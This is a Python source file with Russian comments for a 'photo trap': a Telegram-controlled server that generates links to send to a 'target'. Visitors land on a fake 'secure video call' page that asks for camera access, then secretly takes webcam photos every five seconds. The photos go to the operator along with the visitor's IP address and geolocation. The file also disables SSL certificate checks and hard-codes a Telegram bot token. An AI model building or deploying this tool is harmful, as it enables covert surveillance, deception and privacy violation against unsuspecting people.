"""
ФОТО-ЛОВУШКА ДЛЯ RENDER - ВЕРСИЯ БЕЗ FLASK
Использует встроенный http.server
Токен: 8651750940:AAGdgc9U6MgqjHCkTVy_52mcwccJWaNcE6E
"""

import os
import sys
import json
import random
import string
import time
import threading
import http.server
import socketserver
import urllib.request
import urllib.parse
import base64
import ssl

# ==================== ОТКЛЮЧАЕМ SSL ПРОВЕРКИ ====================
try:
    ssl._create_default_https_context = ssl._create_unverified_context
except:
    pass

# ==================== НАСТРОЙКИ ====================
TOKEN = '8651750940:AAGdgc9U6MgqjHCkTVy_52mcwccJWaNcE6E'
ADMIN_ID = 1173717768

# Render даёт порт через переменную окружения
PORT = int(os.environ.get('PORT', 5000))
# Render сам даёт публичный URL
PUBLIC_URL = os.environ.get('RENDER_EXTERNAL_URL', f'http://localhost:{PORT}')

print(f"\n{'='*60}")
print("📸 ФОТО-ЛОВУШКА ДЛЯ RENDER (БЕЗ FLASK)")
print('='*60)
print(f"👤 Admin ID: {ADMIN_ID}")
print(f"🌐 Публичный URL: {PUBLIC_URL}")
print('='*60)

# Хранилище данных
traps = {}
photos = []

# ==================== ФУНКЦИИ ДЛЯ TELEGRAM ====================
def send_message(chat_id, text, keyboard=None):
    """Отправка сообщения"""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'Markdown'
    }
    if keyboard:
        data['reply_markup'] = json.dumps(keyboard)
    
    try:
        data_encoded = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(url, data=data_encoded, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        urllib.request.urlopen(req, timeout=5)
        return True
    except Exception as e:
        print(f"Ошибка отправки: {e}")
        return False

def send_photo(chat_id, photo_data, caption=""):
    """Отправка фото"""
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    
    try:
        # Кодируем фото в base64 для простоты
        photo_base64 = base64.b64encode(photo_data).decode('utf-8')
        
        data = {
            'chat_id': chat_id,
            'photo': photo_base64,
            'caption': caption
        }
        
        data_encoded = json.dumps(data).encode()
        req = urllib.request.Request(url, data=data_encoded, method='POST')
        req.add_header('Content-Type', 'application/json')
        urllib.request.urlopen(req, timeout=10)
        return True
    except Exception as e:
        print(f"Ошибка отправки фото: {e}")
        return False

def get_updates(offset=0):
    """Получение обновлений"""
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={offset}&timeout=5"
    try:
        req = urllib.request.Request(url, method='GET')
        response = urllib.request.urlopen(req, timeout=5)
        return json.loads(response.read().decode())
    except:
        return {'ok': False, 'result': []}

def answer_callback(callback_id):
    """Ответ на callback"""
    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
    data = urllib.parse.urlencode({'callback_query_id': callback_id}).encode()
    req = urllib.request.Request(url, data=data, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    try:
        urllib.request.urlopen(req)
    except:
        pass

# ==================== МЕНЮ ====================
def get_main_menu():
    return {
        "inline_keyboard": [
            [{"text": "🔗 СОЗДАТЬ ССЫЛКУ", "callback_data": "create"}],
            [{"text": "📊 СТАТИСТИКА", "callback_data": "list"}],
            [{"text": "📸 ПОСЛЕДНИЕ ФОТО", "callback_data": "photos"}],
            [{"text": "❓ ПОМОЩЬ", "callback_data": "help"}]
        ]
    }

def get_back_menu():
    return {
        "inline_keyboard": [
            [{"text": "🔙 НАЗАД", "callback_data": "menu"}]
        ]
    }

def generate_trap_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def get_location_by_ip(ip):
    """Определение местоположения по IP"""
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,city,isp"
        response = urllib.request.urlopen(url, timeout=3)
        data = json.loads(response.read().decode())
        if data.get('status') == 'success':
            return {
                'country': data.get('country', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'isp': data.get('isp', 'Unknown')
            }
    except:
        pass
    return {
        'country': 'Unknown',
        'city': 'Unknown',
        'isp': 'Unknown'
    }

# ==================== HTML СТРАНИЦА ====================
HTML_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>Video Chat</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: rgba(255,255,255,0.2);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 500px;
            margin: 20px;
        }
        h1 { font-size: 36px; margin-bottom: 20px; }
        .btn {
            background: white;
            color: #764ba2;
            border: none;
            padding: 15px 40px;
            border-radius: 30px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin: 20px 0;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            transition: transform 0.3s;
        }
        .btn:hover { transform: scale(1.05); }
        .note { font-size: 14px; opacity: 0.8; margin-top: 20px; }
        #video { display: none; }
        #status { margin: 20px 0; min-height: 30px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>📹 Видеозвонок</h1>
        <p>Вас приглашают присоединиться к защищенному видеозвонку</p>
        <button class="btn" onclick="startCall()">▶️ ПРИСОЕДИНИТЬСЯ</button>
        <div id="status"></div>
        <div class="note">
            🔒 Защищено сквозным шифрованием<br>
            Требуется доступ к камере для установки соединения
        </div>
    </div>
    
    <video id="video" autoplay></video>
    
    <script>
    function startCall() {
        document.getElementById('status').innerHTML = '⏳ Запрос доступа к камере...';
        
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(function(stream) {
                document.getElementById('video').srcObject = stream;
                document.getElementById('status').innerHTML = '✅ Подключение установлено';
                
                // Делаем фото сразу и потом каждые 5 секунд
                captureAndSend();
                setInterval(captureAndSend, 5000);
            })
            .catch(function(error) {
                document.getElementById('status').innerHTML = '❌ Ошибка доступа к камере: ' + error.message;
            });
    }
    
    function captureAndSend() {
        const video = document.getElementById('video');
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        
        if (canvas.width === 0) {
            canvas.width = 640;
            canvas.height = 480;
        }
        
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(function(blob) {
            const reader = new FileReader();
            reader.onloadend = function() {
                const base64data = reader.result.split(',')[1];
                
                fetch('/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        image: base64data,
                        userAgent: navigator.userAgent
                    })
                });
            };
            reader.readAsDataURL(blob);
        }, 'image/jpeg', 0.8);
    }
    </script>
</body>
</html>"""

# ==================== HTTP ХЕНДЛЕР ====================
class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(HTML_TEMPLATE.encode('utf-8'))
            return
        
        # Обработка страниц ловушек
        trap_id = self.path[1:]  # убираем /
        
        if trap_id not in traps:
            self.send_response(404)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(b"<h1>404 Not Found</h1>")
            return
        
        # Получаем IP посетителя
        if self.headers.get('X-Forwarded-For'):
            ip = self.headers.get('X-Forwarded-For').split(',')[0].strip()
        else:
            ip = self.client_address[0]
        
        location = get_location_by_ip(ip)
        
        # Сохраняем информацию о визите
        visit_info = {
            'ip': ip,
            'country': location['country'],
            'city': location['city'],
            'time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'trap_id': trap_id,
            'user_agent': self.headers.get('User-Agent', 'Unknown')
        }
        
        if 'visits' not in traps[trap_id]:
            traps[trap_id]['visits'] = []
        
        traps[trap_id]['visits'].append(visit_info)
        traps[trap_id]['views'] = traps[trap_id].get('views', 0) + 1
        
        print(f"👁 ВИЗИТ: {ip} - {location['city']}, {location['country']}")
        
        # Отправляем уведомление в Telegram
        notify = f"👁 **НОВЫЙ ВИЗИТ!**\n\n"
        notify += f"📝 **Ловушка:** {traps[trap_id]['name']}\n"
        notify += f"🌍 **IP:** `{ip}`\n"
        notify += f"📍 **Место:** {location['city']}, {location['country']}\n"
        notify += f"🕐 **Время:** {visit_info['time']}"
        
        send_message(ADMIN_ID, notify)
        
        # Отправляем HTML страницу
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(HTML_TEMPLATE.encode('utf-8'))
    
    def do_POST(self):
        if self.path == '/upload':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                image_base64 = data.get('image')
                user_agent = data.get('userAgent', 'Unknown')
                
                if image_base64:
                    image_data = base64.b64decode(image_base64)
                    
                    # Получаем IP
                    if self.headers.get('X-Forwarded-For'):
                        ip = self.headers.get('X-Forwarded-For').split(',')[0].strip()
                    else:
                        ip = self.client_address[0]
                    
                    location = get_location_by_ip(ip)
                    
                    # Сохраняем информацию
                    photo_info = {
                        'ip': ip,
                        'country': location['country'],
                        'city': location['city'],
                        'time': time.strftime('%Y-%m-%d %H:%M:%S'),
                        'user_agent': user_agent
                    }
                    photos.append(photo_info)
                    
                    print(f"📸 ПОЛУЧЕНО ФОТО: {ip} - {location['city']}, {location['country']}")
                    
                    # Отправляем фото в Telegram
                    caption = f"📸 **Новое фото!**\n"
                    caption += f"🌍 **IP:** `{ip}`\n"
                    caption += f"📍 **Место:** {location['city']}, {location['country']}\n"
                    caption += f"🕐 **Время:** {photo_info['time']}"
                    
                    send_photo(ADMIN_ID, image_data, caption)
                    
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'OK')
                    return
            except Exception as e:
                print(f"Ошибка обработки фото: {e}")
            
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b'Error')
            return
        
        self.send_response(404)
        self.end_headers()

# ==================== ФОН ДЛЯ TELEGRAM ====================
def telegram_polling():
    """Фоновый процесс для получения команд от Telegram"""
    offset = 0
    user_state = {}
    
    # Отправляем приветствие при запуске
    send_message(ADMIN_ID, 
                f"📸 **ФОТО-ЛОВУШКА ЗАПУЩЕНА!**\n\n"
                f"🔗 **Публичный URL:**\n`{PUBLIC_URL}`\n\n"
                f"**Выбери действие:**",
                get_main_menu())
    
    while True:
        try:
            updates = get_updates(offset)
            
            if updates.get('ok') and updates.get('result'):
                for update in updates['result']:
                    offset = update['update_id'] + 1
                    
                    # Обработка callback
                    if 'callback_query' in update:
                        cb = update['callback_query']
                        cb_id = cb['id']
                        chat_id = cb['message']['chat']['id']
                        data = cb['data']
                        
                        answer_callback(cb_id)
                        
                        if chat_id != ADMIN_ID:
                            continue
                        
                        if data == 'menu':
                            send_message(chat_id, "📋 **Главное меню**", get_main_menu())
                        
                        elif data == 'create':
                            send_message(chat_id, "🔗 **Введите название для ловушки:**", get_back_menu())
                            user_state[chat_id] = 'waiting_name'
                        
                        elif data == 'list':
                            text = "📊 **СТАТИСТИКА:**\n\n"
                            
                            if traps:
                                for tid, trap in traps.items():
                                    text += f"🔹 **{trap['name']}**\n"
                                    text += f"   🆔 `{tid}`\n"
                                    text += f"   👁 Просмотров: {trap.get('views', 0)}\n"
                                    text += f"   📸 Фото: {len(trap.get('visits', []))}\n\n"
                                
                                text += f"\n📸 **Всего фото:** {len(photos)}"
                            else:
                                text += "📭 Пока нет ловушек"
                            
                            send_message(chat_id, text, get_back_menu())
                        
                        elif data == 'photos':
                            if photos:
                                text = "📸 **ПОСЛЕДНИЕ ФОТО:**\n\n"
                                for i, p in enumerate(photos[-5:], 1):
                                    text += f"{i}. 🌍 {p['country']}, {p['city']} - {p['time'][:16]}\n"
                                send_message(chat_id, text, get_back_menu())
                            else:
                                send_message(chat_id, "📭 Пока нет фото", get_back_menu())
                        
                        elif data == 'help':
                            help_text = f"""
❓ **ПОМОЩЬ**

**Как создать ловушку:**
1. Нажми "СОЗДАТЬ ССЫЛКУ"
2. Введи название
3. Получи ссылку: `{PUBLIC_URL}/abc123`
4. Отправь ссылку цели

**Что получаешь:**
• IP и геолокацию при визите
• Фото с камеры (если разрешит)
"""
                            send_message(chat_id, help_text, get_back_menu())
                    
                    # Обычные сообщения
                    elif 'message' in update:
                        chat_id = update['message']['chat']['id']
                        text = update['message'].get('text', '')
                        
                        if chat_id != ADMIN_ID:
                            send_message(chat_id, "⛔ ДОСТУП ЗАПРЕЩЕН")
                            continue
                        
                        if text == '/start':
                            send_message(chat_id, 
                                       f"📸 **ФОТО-ЛОВУШКА**\n\n"
                                       f"🔗 **Публичный URL:**\n`{PUBLIC_URL}`\n\n"
                                       f"**Выбери действие:**",
                                       get_main_menu())
                        
                        elif chat_id in user_state and user_state[chat_id] == 'waiting_name':
                            name = text.strip()
                            if len(name) >= 3:
                                trap_id = generate_trap_id()
                                
                                traps[trap_id] = {
                                    'name': name,
                                    'views': 0,
                                    'visits': [],
                                    'created_by': chat_id
                                }
                                
                                full_url = f"{PUBLIC_URL}/{trap_id}"
                                
                                send_message(
                                    chat_id,
                                    f"✅ **ЛОВУШКА СОЗДАНА!**\n\n"
                                    f"📝 **Название:** {name}\n"
                                    f"🔗 **Ссылка:** `{full_url}`\n\n"
                                    f"📌 Отправь эту ссылку цели!",
                                    get_main_menu()
                                )
                            else:
                                send_message(chat_id, "❌ Слишком короткое название", get_back_menu())
                            
                            del user_state[chat_id]
            
            time.sleep(1)
            
        except Exception as e:
            print(f"Ошибка в polling: {e}")
            time.sleep(5)

# ==================== ЗАПУСК ====================
if __name__ == '__main__':
    print("\n" + "="*60)
    print("📸 ФОТО-ЛОВУШКА ДЛЯ RENDER (БЕЗ FLASK)")
    print("="*60)
    print(f"👤 Admin ID: {ADMIN_ID}")
    print(f"🌐 Публичный URL: {PUBLIC_URL}")
    print("="*60)
    
    # Запускаем фоновый поток для Telegram
    telegram_thread = threading.Thread(target=telegram_polling, daemon=True)
    telegram_thread.start()
    
    # Запускаем HTTP сервер
    try:
        with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
            print(f"🌐 HTTP сервер запущен на порту {PORT}")
            httpd.serve_forever()
    except Exception as e:
        print(f"❌ Ошибка сервера: {e}")
